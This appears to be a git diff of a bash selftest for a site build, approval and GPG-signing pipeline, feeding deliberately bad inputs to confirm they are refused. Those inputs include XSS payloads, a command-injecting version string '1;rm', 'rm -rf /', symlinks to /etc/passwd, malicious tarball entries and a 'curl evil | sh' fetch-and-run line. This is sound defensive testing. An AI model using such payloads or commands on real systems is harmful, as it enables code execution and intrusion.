@@ -1,94 +1,255 @@
 #!/usr/bin/env bash
-# Selftest of site-bauen.sh, site-freigabe-pruefen.sh, site-signieren.sh and the stage-0 templates. Own temporary keys, nothing else touched.
-# Every rule has a counter-test: the thing must turn RED when the rule is broken. Exit 0 only when all pass.
+# Selftest of site-bauen.sh, site-freigabe-pruefen.sh, site-signieren.sh, site-signaturen-pruefen.sh and the stage-0 templates. Own temporary keys.
+# Every rule has a counter-test: the thing must turn RED when the rule is broken; the checks that matter most are also run against a MUTATED COPY of
+# the script (a switched-off comparison must be noticed). Exit 0 only when all pass.
 # shellcheck disable=SC2015,SC2329  # "A && ok || bad": ok and bad never fail; helper functions are used through red/grn
 set -uo pipefail
 here=$(cd "$(dirname "$0")" && pwd); root=$(cd "$here/.." && pwd)
 t=$(mktemp -d); export GNUPGHOME="$t/gh"; mkdir -m 700 "$GNUPGHOME"; trap 'gpgconf --kill gpg-agent >/dev/null 2>&1; rm -rf "$t"' EXIT
+unset GITHUB_ACTIONS GITHUB_RUN_ID GITHUB_RUN_ATTEMPT
 fail=0; ok() { echo "ok   $1"; }; bad() { echo "FAIL $1"; fail=1; }
 red() { local n=$1; shift; if "$@" >"$t/o" 2>&1; then bad "$n (was green)"; else ok "$n"; [ -z "${VERBOSE:-}" ] || sed "s/^/       /" "$t/o" | grep -E "RED|error|:" | head -2; fi; }
 grn() { local n=$1; shift; if "$@" >"$t/o" 2>&1; then ok "$n"; else bad "$n"; sed 's/^/     /' "$t/o"; fi; }
 
-# --- keys: approver (human), release (CI), stranger
-mk() { gpg --batch --quiet --passphrase '' --quick-generate-key "$1" ed25519 sign 1d >/dev/null 2>&1; gpg --batch --list-keys --with-colons "$1" | awk -F: '/^fpr:/{print $10; exit}'; }
-appr=$(mk "approver@test"); rel=$(mk "release@test"); other=$(mk "stranger@test")
-gpg --batch --export "$appr" > "$t/appr.pub"; gpg --batch --export "$other" > "$t/other.pub"
+# --- keys: approver (human, a primary key AND a signing subkey), release (CI), stranger
+fp1() { gpg --batch --list-keys --with-colons "$1" | awk -F: '/^fpr:/{print $10; exit}'; }
+mk() { gpg --batch --quiet --passphrase '' --quick-generate-key "$1" ed25519 sign 1d >/dev/null 2>&1; fp1 "$1"; }
+appr=$(mk "approver@test"); rel=$(mk "release@test"); other=$(mk "stranger@test"); appr2=$(mk "approver2@test")
+gpg --batch --quiet --passphrase '' --quick-add-key "$appr2" ed25519 sign 1d >/dev/null 2>&1
+sub2=$(gpg --batch --list-keys --with-colons "$appr2" | awk -F: '/^sub:/{s=1} s&&/^fpr:/{print $10; exit}')
+gpg --batch --export "$appr" > "$t/appr.pub"; gpg --batch --export "$other" > "$t/other.pub"; gpg --batch --export "$appr2" > "$t/appr2.pub"
 gpg --batch --armor --export "$rel" > "$t/rel.pub.asc"
 gpg --batch --armor --export-secret-keys "$rel" > "$t/rel.sec.asc"
-for k in appr other; do gpg --batch --no-default-keyring --keyring "$t/$k.ring" --import "$t/$k.pub" 2>/dev/null; done
-printf '%s\n' "# allowed approvers" "$appr" > "$t/allowed"
+for k in appr other appr2; do gpg --batch --no-default-keyring --keyring "$t/$k.ring" --import "$t/$k.pub" 2>/dev/null; done
+printf '%s\n' "# allowed signing keys" "$appr" > "$t/allowed"
+[ -n "$sub2" ] && [ "$sub2" != "$appr2" ] && ok "setup: second approver has a separate signing subkey" || bad "setup: subkey"
 
-# --- the folder, built from the real stage-0 pages
-mkdir -p "$t/src/de"; cp "$root/templates/site/sites/helfa.org/index.html" "$t/src/"; cp "$root/templates/site/sites/helfa.org/de/index.html" "$t/src/de/"
-grn "build: good folder" "$here/site-bauen.sh" build "$t/src" "$t/dist" helfa.org 0.0.1
-tree=$(grep '^tree-sha256=' "$t/o" | cut -d= -f2)
-[ -n "$tree" ] && ok "build prints the tree hash" || bad "build prints the tree hash"
-grn "build: second build into another folder is byte-identical (same hash)" bash -c "'$here/site-bauen.sh' build '$t/src' '$t/dist2' helfa.org 0.0.1 && cmp '$t/dist/helfa.org-0.0.1-site.tar.gz' '$t/dist2/helfa.org-0.0.1-site.tar.gz'"
-red "build: non-empty outdir refused" "$here/site-bauen.sh" build "$t/src" "$t/dist" helfa.org 0.0.1
-for case in "script|<script>1</script>" "external|<img src=\"https://x.test/a.png\">" "secret|password = abc" "private-key|-----BEGIN PRIVATE KEY-----"; do
-  n=${case%%|*}; cp -r "$t/src" "$t/bad-$n"; printf '%s\n' "${case#*|}" >> "$t/bad-$n/index.html"
-  red "build: $n in the folder is refused" "$here/site-bauen.sh" build "$t/bad-$n" "$t/o-$n" helfa.org 0.0.1
+# --- the folder (written here: no placeholder pages are kept in git; the input of site-bauen is a folder a person approved)
+mkdir -p "$t/src/de"
+printf '<!doctype html>\n<html lang="en"><head><meta charset="utf-8"><title>t</title><style>p{color:#111}</style></head><body><p>hello</p><a href="https://example.org/x">out</a> <a href="/de/">de</a></body></html>\n' > "$t/src/index.html"
+printf '<!doctype html>\n<html lang="de"><head><meta charset="utf-8"><title>t</title></head><body><p>hallo</p></body></html>\n' > "$t/src/de/index.html"
+B="$here/site-bauen.sh"
+grn "build: good folder" "$B" build "$t/src" "$t/dist" helfa.org 0.0.1
+tree=$(grep '^tree-sha256=' "$t/o" | cut -d= -f2); tarh=$(grep '^tar-sha256=' "$t/o" | cut -d= -f2)
+[ -n "$tree" ] && [ -n "$tarh" ] && ok "build prints the tree hash and the tarball hash" || bad "build prints the hashes"
+[ "$tarh" = "$(sha256sum "$t/dist/helfa.org-0.0.1-site.tar.gz" | cut -d' ' -f1)" ] && ok "tar-sha256 is the hash of the tarball file" || bad "tar-sha256 of the file"
+grn "build: second build into another folder is byte-identical (same hash)" bash -c "'$B' build '$t/src' '$t/dist2' helfa.org 0.0.1 && cmp '$t/dist/helfa.org-0.0.1-site.tar.gz' '$t/dist2/helfa.org-0.0.1-site.tar.gz'"
+red "build: non-empty outdir refused" "$B" build "$t/src" "$t/dist" helfa.org 0.0.1
+red "build: bad version refused" "$B" build "$t/src" "$t/o-v" helfa.org "1;rm"
+
+# --- folder check: allowlist (mode static). Each case: name | file | content appended (or the whole file for new files)
+fc() { # name file content
+  rm -rf "$t/f-$1"; cp -r "$t/src" "$t/f-$1"; mkdir -p "$(dirname "$t/f-$1/$2")"; printf '%s\n' "$3" >> "$t/f-$1/$2"
+  red "folder: $1 is refused" "$B" check "$t/f-$1"; }
+fc script index.html '<script>1</script>'
+fc script-upper index.html '<SCRIPT SRC=x.js></SCRIPT>'
+fc onerror index.html '<img src="x.png" onerror="alert(1)">'
+fc onclick-unquoted index.html '<a href="/x" onclick=alert(1)>x</a>'
+fc js-url index.html '<a href="javascript:alert(1)">x</a>'
+fc js-url-entity index.html '<a href="jav&#x61;script:alert(1)">x</a>'
+fc ext-img-double index.html '<img src="https://x.test/a.png">'
+fc ext-img-single index.html "<img src='https://x.test/a.png'>"
+fc ext-img-unquoted index.html '<img src=https://x.test/a.png>'
+fc ext-img-protocol-relative index.html '<img src="//x.test/a.png">'
+fc meta-refresh index.html '<meta http-equiv=refresh content="0;url=https://fremd.test/">'
+fc css-url index.html "<style>body{background:url('https://x.test/a.png')}</style>"
+fc css-import style.css '@import "x.css";'
+fc css-file-url style.css 'a{background:url(https://x.test/a.png)}'
+fc style-attr index.html '<p style="background:url(//x.test/a.png)">x</p>'
+fc srcset index.html '<img srcset="a.png 1x, https://x.test/b.png 2x" src="a.png">'
+fc svg-image-href logo.svg '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://x.test/a.png"/></svg>'
+fc svg-script logo.svg '<svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>'
+fc link-stylesheet index.html '<link rel="stylesheet" href="https://x.test/a.css">'
+fc iframe index.html '<iframe src="x.html"></iframe>'
+fc data-url index.html '<a href="data:text/html;base64,AAAA">x</a>'
+fc secret index.html 'password = abc'
+fc private-key index.html '-----BEGIN PRIVATE KEY-----'
+fc dotfile-env .env 'X=1'
+fc dotfolder-git .git/config 'url = https://user:pw@example.org/'
+fc dotfile-htaccess .htaccess 'x'
+fc exe-type run.exe 'MZ'
+fc shell-type install.sh 'rm -rf /'
+fc php-type x.php '<?php ?>'
+fc js-in-static app.js 'alert(1)'
+fc no-extension README 'x'
+cp -r "$t/src" "$t/bad-link"; ln -s /etc/passwd "$t/bad-link/x.txt"; red "folder: symlink refused" "$B" check "$t/bad-link"
+cp -r "$t/src" "$t/bad-dlink"; ln -s /etc "$t/bad-dlink/dir"; red "folder: symlink to a folder refused" "$B" check "$t/bad-dlink"
+cp -r "$t/src" "$t/bad-name"; : > "$t/bad-name/a b.html"; red "folder: unsafe file name refused" "$B" check "$t/bad-name"
+cp -r "$t/src" "$t/bad-suid"; chmod 4755 "$t/bad-suid/index.html"; red "folder: set-uid bit refused" "$B" check "$t/bad-suid"
+mkdir "$t/noindex"; echo x > "$t/noindex/a.html"; red "folder: no index.html refused" "$B" check "$t/noindex"
+grn "folder: ordinary link, style and image types pass" bash -c "cp -r '$t/src' '$t/f-ok' && printf 'p{color:red}' > '$t/f-ok/s.css' && printf 'PNG' > '$t/f-ok/a.png' && printf '<a href=\"mailto:x@example.org\">m</a><img src=\"a.png\">' >> '$t/f-ok/index.html' && '$B' check '$t/f-ok'"
+# mode passthrough: a person's own HTML with JavaScript, explicitly; allowlist and log stay
+rm -rf "$t/pt"; cp -r "$t/src" "$t/pt"; printf '<script src="https://cdn.example/x.js"></script><script>1</script>\n' >> "$t/pt/index.html"; echo 'document.title="x"' > "$t/pt/app.js"
+grn "passthrough: own HTML with scripts passes" "$B" --passthrough check "$t/pt"
+grep -q '^log: index.html sha256=[0-9a-f]\{64\} size=[0-9]* script external' "$t/o" && grep -q '^log: app.js .* script' "$t/o" && ok "passthrough: every file is logged (hash, size, script/external)" || bad "passthrough log"
+red "passthrough: the same folder is refused in static mode" "$B" check "$t/pt"
+for case in "dotfile|.env|X=1" "exe|run.exe|MZ" "secret|s.js|var token = 'abc'" "key|k.txt|-----BEGIN PRIVATE KEY-----"; do
+  IFS='|' read -r n f c <<<"$case"; rm -rf "$t/pt-$n"; cp -r "$t/pt" "$t/pt-$n"; printf '%s\n' "$c" > "$t/pt-$n/$f"; red "passthrough: $n is still refused" "$B" --passthrough check "$t/pt-$n"
 done
-cp -r "$t/src" "$t/bad-link"; ln -s /etc/passwd "$t/bad-link/x.txt"; red "build: symlink refused" "$here/site-bauen.sh" check "$t/bad-link"
-cp -r "$t/src" "$t/bad-name"; : > "$t/bad-name/a b.html"; red "build: unsafe file name refused" "$here/site-bauen.sh" check "$t/bad-name"
-mkdir "$t/noindex"; echo x > "$t/noindex/a.html"; red "build: no index.html refused" "$here/site-bauen.sh" check "$t/noindex"
-red "build: bad version refused" "$here/site-bauen.sh" build "$t/src" "$t/o-v" helfa.org "1;rm"
+grn "passthrough: build records the mode" bash -c "'$B' --passthrough build '$t/pt' '$t/dpt' helfa.org 0.0.1 | grep -q '^mode=passthrough' && grep -q '\"mode\": \"passthrough\"' '$t/dpt/helfa.org-0.0.1-manifest.json'"
+
+# --- mutation of the build script: the byte comparison of the double build must bite (nothing else makes it red here)
+mkdir -p "$t/mut"; cp "$here"/site-bauen.sh "$here"/site-lib.sh "$here"/site-pruefen.py "$here"/site-tar-pruefen.py "$t/mut/"
+sed -i 's/"tools": {"tar": tarv, "gzip": gzv}, "files": files}/"tools": {"tar": tarv, "gzip": gzv}, "nonce": os.urandom(8).hex(), "files": files}/' "$t/mut/site-bauen.sh"
+grep -q 'os.urandom' "$t/mut/site-bauen.sh" && ok "mutation: nondeterminism injected into a copy" || bad "mutation: injection did not apply (the script changed: adjust the test)"
+red "mutation: a non-reproducible build is refused (the byte comparison is alive)" "$t/mut/site-bauen.sh" build "$t/src" "$t/m1" helfa.org 0.0.1
+# shellcheck disable=SC2016  # the pattern is meant literally
+sed -i 's/if ! diff -r "\$out" "\$chk\/again" >\/dev\/null; then/if false \&\& ! diff -r "$out" "$chk\/again" >\/dev\/null; then/' "$t/mut/site-bauen.sh"
+grep -q 'if false &&' "$t/mut/site-bauen.sh" && ok "mutation: comparison switched off in the copy" || bad "mutation: switch-off did not apply (the script changed: adjust the test)"
+grn "mutation control: with the comparison off the same build passes, so the red above is the comparison" "$t/mut/site-bauen.sh" build "$t/src" "$t/m2" helfa.org 0.0.1
+
+# --- the tarball allowlist (B2): nothing but plain files and folders; each odd entry is refused BEFORE unpacking
+mktar() { python3 -I - "$1" "$2" <<'PY'
+import io, sys, tarfile
+kind, out = sys.argv[1:3]
+tf = tarfile.open(out, "w:gz", format=tarfile.GNU_FORMAT)
+def add(name, typ=tarfile.REGTYPE, mode=0o644, data=b"x", link="", uid=0, mtime=0):
+    i = tarfile.TarInfo(name); i.type = typ; i.mode = mode; i.uid = i.gid = uid; i.mtime = mtime; i.linkname = link
+    i.size = len(data) if typ == tarfile.REGTYPE else 0
+    tf.addfile(i, io.BytesIO(data) if typ == tarfile.REGTYPE else None)
+add("./", tarfile.DIRTYPE, 0o755); add("./index.html", data=b"<p>x</p>")
+{"good": lambda: None,
+ "symlink": lambda: add("./de/leak.html", tarfile.SYMTYPE, 0o777, link="/etc/passwd"),
+ "hardlink": lambda: add("./h.html", tarfile.LNKTYPE, 0o644, link="./index.html"),
+ "device": lambda: add("./dev", tarfile.CHRTYPE, 0o644),
+ "dir777": lambda: add("./de/", tarfile.DIRTYPE, 0o777),
+ "setuid": lambda: add("./x.html", mode=0o4755),
+ "exec0700": lambda: add("./x.html", mode=0o700),
+ "absolute": lambda: add("/etc/x.html"),
+ "dotdot": lambda: add("./../x.html"),
+ "dotfile": lambda: add("./.env"),
+ "owner": lambda: add("./x.html", uid=1000),
+ "mtime": lambda: add("./x.html", mtime=1700000000),
+ "twice": lambda: add("./index.html"),
+ "emptydir-ok": lambda: add("./empty/", tarfile.DIRTYPE, 0o755)}[kind]()
+tf.close()
+PY
+}
+mktar good "$t/tar-good.tgz"; grn "tarball check: a tarball like site-bauen writes passes" python3 -I "$here/site-tar-pruefen.py" "$t/tar-good.tgz"
+grn "tarball check: the real built tarball passes" python3 -I "$here/site-tar-pruefen.py" "$t/dist/helfa.org-0.0.1-site.tar.gz"
+for k in symlink hardlink device dir777 setuid exec0700 absolute dotdot dotfile owner mtime twice; do mktar "$k" "$t/tar-$k.tgz"; red "tarball check: $k is refused" python3 -I "$here/site-tar-pruefen.py" "$t/tar-$k.tgz"; done
+echo "not a tar" > "$t/tar-junk.tgz"; red "tarball check: junk is refused" python3 -I "$here/site-tar-pruefen.py" "$t/tar-junk.tgz"
 
 # --- the approval
 exp=$(date -u -d '+24 hours' +%Y-%m-%dT%H:%M:%SZ)
-approval() { # file tree run expires [gate]
-  printf 'gate: %s\nname: helfa.org\nversion: 0.0.1\ntree-sha256: %s\nrun-id: %s\nexpires: %s\n' "${5:-site-signieren}" "$2" "$3" "$4" > "$1"; }
+approval() { # file tree tar run expires [gate] [mode]
+  printf 'gate: %s\nname: helfa.org\nversion: 0.0.1\nmode: %s\ntree-sha256: %s\ntar-sha256: %s\nrun-id: %s\nexpires: %s\n' "${6:-site-signieren}" "${7:-static}" "$2" "$3" "$4" "$5" > "$1"; }
 signit() { gpg --batch --yes --local-user "$1" --armor --detach-sign --output "$2.asc" "$2" 2>/dev/null; }
-approval "$t/a.txt" "$tree" run-0001 "$exp"; signit "$appr" "$t/a.txt"
-check() { "$here/site-freigabe-pruefen.sh" "$t/dist" "$1" "$1.asc" "${2:-$t/appr.ring}" "${3:-$t/allowed}" "${4:-run-0001}" "${5:-}"; }
+approval "$t/a.txt" "$tree" "$tarh" run-0001 "$exp"; signit "$appr" "$t/a.txt"
+check() { "$here/site-freigabe-pruefen.sh" "${6:-$t/dist}" "$1" "$1.asc" "${2:-$t/appr.ring}" "${3:-$t/allowed}" "${4:-run-0001}" "${5:-}"; }
 grn "approval: good one passes" check "$t/a.txt"
 red "approval: other run id (replay) is red" check "$t/a.txt" "" "" run-0002
-approval "$t/b.txt" "$(printf x | sha256sum | cut -d' ' -f1)" run-0001 "$exp"; signit "$appr" "$t/b.txt"; red "approval: for another hash is red" check "$t/b.txt"
-approval "$t/c.txt" "$tree" run-0001 "$(date -u -d '-1 hour' +%Y-%m-%dT%H:%M:%SZ)"; signit "$appr" "$t/c.txt"; red "approval: expired is red" check "$t/c.txt"
-approval "$t/d.txt" "$tree" run-0001 "$(date -u -d '+10 days' +%Y-%m-%dT%H:%M:%SZ)"; signit "$appr" "$t/d.txt"; red "approval: valid for more than 72 hours is red" check "$t/d.txt"
-approval "$t/e.txt" "$tree" run-0001 "$exp"; signit "$other" "$t/e.txt"
+zero=0000000000000000000000000000000000000000000000000000000000000000
+approval "$t/b.txt" "$(printf x | sha256sum | cut -d' ' -f1)" "$tarh" run-0001 "$exp"; signit "$appr" "$t/b.txt"; red "approval: for another tree hash is red" check "$t/b.txt"
+approval "$t/b2.txt" "$tree" "$zero" run-0001 "$exp"; signit "$appr" "$t/b2.txt"; red "approval: for another tarball hash (the bytes) is red" check "$t/b2.txt"
+approval "$t/c.txt" "$tree" "$tarh" run-0001 "$(date -u -d '-1 hour' +%Y-%m-%dT%H:%M:%SZ)"; signit "$appr" "$t/c.txt"; red "approval: expired is red" check "$t/c.txt"
+approval "$t/d.txt" "$tree" "$tarh" run-0001 "$(date -u -d '+10 days' +%Y-%m-%dT%H:%M:%SZ)"; signit "$appr" "$t/d.txt"; red "approval: valid for more than 72 hours is red" check "$t/d.txt"
+# 72 hours count from the SIGNATURE time: checked 48 h after signing, an approval that runs to signature+70h is fine, one that runs to check+70h is not
+now48=$(( $(date -u +%s) + 48 * 3600 ))
+approval "$t/d2.txt" "$tree" "$tarh" run-0001 "$(date -u -d '+70 hours' +%Y-%m-%dT%H:%M:%SZ)"; signit "$appr" "$t/d2.txt"; grn "approval: signature+70h, checked 48 h after signing, is fine" check "$t/d2.txt" "" "" "" "$now48"
+approval "$t/d3.txt" "$tree" "$tarh" run-0001 "$(date -u -d "@$((now48 + 70 * 3600))" +%Y-%m-%dT%H:%M:%SZ)"; signit "$appr" "$t/d3.txt"; red "approval: check time+70h (more than 72 h after signing) is red" check "$t/d3.txt" "" "" "" "$now48"
+red "approval: signature dated in the future (check time is a day earlier) is red" check "$t/a.txt" "" "" "" "$(( $(date -u +%s) - 86400 ))"
+approval "$t/e.txt" "$tree" "$tarh" run-0001 "$exp"; signit "$other" "$t/e.txt"
 red "approval: signed by a stranger (not on the list) is red" check "$t/e.txt" "$t/other.ring"
 red "approval: stranger's key not in the keyring is red" check "$t/e.txt"
-approval "$t/f.txt" "$tree" run-0001 "$exp" other-gate; signit "$appr" "$t/f.txt"; red "approval: another gate is red" check "$t/f.txt"
+approval "$t/f.txt" "$tree" "$tarh" run-0001 "$exp" other-gate; signit "$appr" "$t/f.txt"; red "approval: another gate is red" check "$t/f.txt"
+approval "$t/f2.txt" "$tree" "$tarh" run-0001 "$exp" site-signieren passthrough; signit "$appr" "$t/f2.txt"; red "approval: mode passthrough against a static build is red" check "$t/f2.txt"
+approval "$t/f3.txt" "$tree" "$tarh" run-0001 "$exp" site-signieren wild; signit "$appr" "$t/f3.txt"; red "approval: unknown mode is red" check "$t/f3.txt"
 cp "$t/a.txt" "$t/g.txt"; cp "$t/a.txt.asc" "$t/g.txt.asc"; echo "extra: 1" >> "$t/g.txt"; red "approval: text changed after signing is red" check "$t/g.txt"
 cp "$t/a.txt" "$t/h.txt"; : > "$t/h.txt.asc"; red "approval: empty signature file is red" check "$t/h.txt"
 red "approval: missing approval file is red" check "$t/none.txt"
 : > "$t/empty-allowed"; red "approval: empty allowed list is red" check "$t/a.txt" "" "$t/empty-allowed"
 printf '%s\n' "not-a-fingerprint" > "$t/junk-allowed"; red "approval: junk in the allowed list is red" check "$t/a.txt" "" "$t/junk-allowed"
-approval "$t/i.txt" "$tree" run-0001 "$exp"; echo "tree-sha256: $tree" >> "$t/i.txt"; signit "$appr" "$t/i.txt"; red "approval: key twice is red" check "$t/i.txt"
+approval "$t/i.txt" "$tree" "$tarh" run-0001 "$exp"; echo "tree-sha256: $tree" >> "$t/i.txt"; signit "$appr" "$t/i.txt"; red "approval: key twice is red" check "$t/i.txt"
 red "approval: unsigned text (a plain event) is red" "$here/site-freigabe-pruefen.sh" "$t/dist" "$t/a.txt" "$t/none.asc" "$t/appr.ring" "$t/allowed" run-0001
-cp -r "$t/dist" "$t/dist-t"; echo tamper >> "$t/dist-t/helfa.org-0.0.1-site.tar.gz"
-red "approval: tarball changed after the build is red" "$here/site-freigabe-pruefen.sh" "$t/dist-t" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001
-cp -r "$t/dist" "$t/dist-m"; sed -i 's/"tree_sha256": "[0-9a-f]*"/"tree_sha256": "0000000000000000000000000000000000000000000000000000000000000000"/' "$t/dist-m/helfa.org-0.0.1-manifest.json"
+# the signing SUBKEY is what is pinned: the primary fingerprint does not stand for a software subkey under it
+approval "$t/j.txt" "$tree" "$tarh" run-0001 "$exp"; gpg --batch --yes --local-user "$sub2!" --armor --detach-sign --output "$t/j.txt.asc" "$t/j.txt" 2>/dev/null
+printf '%s\n' "$appr2" > "$t/allow-primary"; printf '%s\n' "$sub2" > "$t/allow-sub"; printf '%s\n' "$appr2" > "$t/allow-sub-other"
+red "approval: signed by a subkey while only the primary key is listed is red" check "$t/j.txt" "$t/appr2.ring" "$t/allow-primary"
+grn "approval: signed by the listed subkey passes" check "$t/j.txt" "$t/appr2.ring" "$t/allow-sub"
+approval "$t/k.txt" "$tree" "$tarh" run-0001 "$exp"; gpg --batch --yes --local-user "$appr2!" --armor --detach-sign --output "$t/k.txt.asc" "$t/k.txt" 2>/dev/null
+red "approval: signed by the primary key while only the subkey is listed is red" check "$t/k.txt" "$t/appr2.ring" "$t/allow-sub"
+# in CI the run id is the earlier build run: format enforced, and not the signing run itself
+approval "$t/l.txt" "$tree" "$tarh" 77-1 "$exp"; signit "$appr" "$t/l.txt"
+grn "approval in CI: run id of an earlier run (<id>-<attempt>) passes" env GITHUB_ACTIONS=true GITHUB_RUN_ID=88 GITHUB_RUN_ATTEMPT=1 "$here/site-freigabe-pruefen.sh" "$t/dist" "$t/l.txt" "$t/l.txt.asc" "$t/appr.ring" "$t/allowed" 77-1
+red "approval in CI: the run id of the signing run itself is red" env GITHUB_ACTIONS=true GITHUB_RUN_ID=77 GITHUB_RUN_ATTEMPT=1 "$here/site-freigabe-pruefen.sh" "$t/dist" "$t/l.txt" "$t/l.txt.asc" "$t/appr.ring" "$t/allowed" 77-1
+red "approval in CI: a free-text run id is red" env GITHUB_ACTIONS=true GITHUB_RUN_ID=88 GITHUB_RUN_ATTEMPT=1 "$here/site-freigabe-pruefen.sh" "$t/dist" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001
+# the dist folder (B1) and the tarball (B2)
+cp -r "$t/dist" "$t/dist-x"; echo 'curl evil | sh' > "$t/dist-x/install.sh"; red "approval: a foreign file in dist is red (it would be signed)" check "$t/a.txt" "" "" "" "" "$t/dist-x"
+cp -r "$t/dist" "$t/dist-y"; rm "$t/dist-y/helfa.org-0.0.1.spdx.json"; red "approval: a missing file in dist is red" check "$t/a.txt" "" "" "" "" "$t/dist-y"
+cp -r "$t/dist" "$t/dist-z"; mkdir "$t/dist-z/sub"; red "approval: a folder in dist is red" check "$t/a.txt" "" "" "" "" "$t/dist-z"
+cp -r "$t/dist" "$t/dist-t"; echo tamper >> "$t/dist-t/helfa.org-0.0.1-site.tar.gz"; red "approval: tarball changed after the build is red" check "$t/a.txt" "" "" "" "" "$t/dist-t"
+cp -r "$t/dist" "$t/dist-m"; sed -i 's/"tree_sha256": "[0-9a-f]*"/"tree_sha256": "'"$zero"'"/' "$t/dist-m/helfa.org-0.0.1-manifest.json"
 (cd "$t/dist-m" && sha256sum helfa.org-0.0.1-site.tar.gz helfa.org-0.0.1-manifest.json helfa.org-0.0.1.spdx.json > SHA256SUMS.txt)
-red "approval: manifest lying about the hash is red" "$here/site-freigabe-pruefen.sh" "$t/dist-m" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001
+red "approval: manifest lying about the hash is red" check "$t/a.txt" "" "" "" "" "$t/dist-m"
+# repack helper: a new tarball in a copy of dist, sums and manifest rewritten to match (what a hostile build job would do)
+repack() { # distcopy kind: unpack, add something, pack again like site-bauen does not (plain tar), fix sums and manifest
+  local d=$1 kind=$2 w="$t/rp-$2"; rm -rf "$w"; mkdir -p "$w"; tar -xzf "$d/helfa.org-0.0.1-site.tar.gz" -C "$w"
+  case $kind in
+    symlink) mkdir -p "$w/de"; ln -s /etc/passwd "$w/de/leak.html"; chmod 777 "$w/de" ;;
+    emptydir) mkdir "$w/empty" ;;
+    exec) chmod 755 "$w/index.html" ;;
+  esac
+  (cd "$w" && tar --sort=name --mtime=@0 --owner=0 --group=0 --numeric-owner --format=gnu -cf - .) | gzip -n -9 > "$d/helfa.org-0.0.1-site.tar.gz"
+  new=$(sha256sum "$d/helfa.org-0.0.1-site.tar.gz" | cut -d' ' -f1)
+  sed -i 's/"tar_sha256": "[0-9a-f]*"/"tar_sha256": "'"$new"'"/' "$d/helfa.org-0.0.1-manifest.json"
+  (cd "$d" && sha256sum helfa.org-0.0.1-site.tar.gz helfa.org-0.0.1-manifest.json helfa.org-0.0.1.spdx.json > SHA256SUMS.txt)
+  echo "$new"
+}
+cp -r "$t/dist" "$t/dist-l"; ntar=$(repack "$t/dist-l" symlink)
+red "approval: the old approval does not cover a repacked tarball with a symlink and a 0777 folder" check "$t/a.txt" "" "" "" "" "$t/dist-l"
+approval "$t/m.txt" "$tree" "$ntar" run-0001 "$exp"; signit "$appr" "$t/m.txt"
+red "approval: even an approval of those exact bytes is red (symlink, 0777 folder: allowlist)" check "$t/m.txt" "" "" "" "" "$t/dist-l"
+cp -r "$t/dist" "$t/dist-e"; repack "$t/dist-e" emptydir >/dev/null
+red "approval: same files plus an empty folder (same tree hash, other bytes) is red: the bytes are bound" check "$t/a.txt" "" "" "" "" "$t/dist-e"
+cp -r "$t/dist" "$t/dist-p"; repack "$t/dist-p" exec >/dev/null
+red "approval: same files with an execute bit (same tree hash, other bytes) is red: the bytes are bound" check "$t/a.txt" "" "" "" "" "$t/dist-p"
 
-# --- signing
+# --- signing: order key last, rebuild from the approved source, nothing foreign
 rm -rf "$t/d1"; cp -r "$t/dist" "$t/d1"
-sign() { GPG_PRIVATE_KEY=$(cat "$t/rel.sec.asc") "$here/site-signieren.sh" "$1" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/rel.pub.asc"; }
-red "sign: without the key is red (not 'not signed, exit 0')" env -u GPG_PRIVATE_KEY "$here/site-signieren.sh" "$t/d1" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/rel.pub.asc"
-red "sign: with a bad approval signs nothing" env "GPG_PRIVATE_KEY=$(cat "$t/rel.sec.asc")" "$here/site-signieren.sh" "$t/d1" "$t/e.txt" "$t/e.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/rel.pub.asc"
+S="$here/site-signieren.sh"
+sign() { # dist [approval] [src] [run]
+  GPG_PRIVATE_KEY=$(cat "$t/rel.sec.asc") "$S" "$1" "${2:-$t/a.txt}" "${2:-$t/a.txt}.asc" "$t/appr.ring" "$t/allowed" "${4:-run-0001}" "$t/rel.pub.asc" "${3:-$t/src}"; }
+red "sign: without the key is red (not 'not signed, exit 0')" env -u GPG_PRIVATE_KEY "$S" "$t/d1" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/rel.pub.asc" "$t/src"
+red "sign: with a bad approval signs nothing" sign "$t/d1" "$t/e.txt"
 [ -z "$(find "$t/d1" -name '*.asc' -print -quit)" ] && ok "sign: a bad approval left no .asc" || bad "sign: a bad approval left no .asc"
-grn "sign: good approval signs" sign "$t/d1"
-grn "sign: every file has a signature" bash -c "cd '$t/d1' && for f in helfa.org-0.0.1-site.tar.gz helfa.org-0.0.1-manifest.json helfa.org-0.0.1.spdx.json SHA256SUMS.txt approval.txt; do test -s \$f.asc; done"
+rm -rf "$t/d3"; cp -r "$t/dist" "$t/d3"; echo 'curl evil | sh' > "$t/d3/install.sh"
+red "sign: a foreign file in dist is red" sign "$t/d3"
+[ ! -e "$t/d3/install.sh.asc" ] && [ -z "$(find "$t/d3" -name '*.asc' -print -quit)" ] && ok "sign: the foreign file got no release signature" || bad "sign: the foreign file got a signature"
+rm -rf "$t/srcx"; cp -r "$t/src" "$t/srcx"; echo '<p>other</p>' >> "$t/srcx/index.html"
+rm -rf "$t/d4"; cp -r "$t/dist" "$t/d4"
+red "sign: a rebuild from another source than the approved one is red" sign "$t/d4" "$t/a.txt" "$t/srcx"
+[ -z "$(find "$t/d4" -name '*.asc' -print -quit)" ] && ok "sign: the rebuild comparison came before the key (no .asc)" || bad "sign: .asc after a failed rebuild comparison"
+grn "sign: good approval and the approved source sign" sign "$t/d1"
+grn "sign: every file has a signature (signatures-check)" "$here/site-signaturen-pruefen.sh" "$t/d1" "$t/rel.pub.asc" helfa.org-0.0.1
+cp -r "$t/d1" "$t/d5"; echo x > "$t/d5/install.sh"; red "signatures-check: a foreign file next to the signed ones is red" "$here/site-signaturen-pruefen.sh" "$t/d5" "$t/rel.pub.asc" helfa.org-0.0.1
+cp -r "$t/d1" "$t/d6"; rm "$t/d6/SHA256SUMS.txt.asc"; red "signatures-check: a missing .asc is red" "$here/site-signaturen-pruefen.sh" "$t/d6" "$t/rel.pub.asc" helfa.org-0.0.1
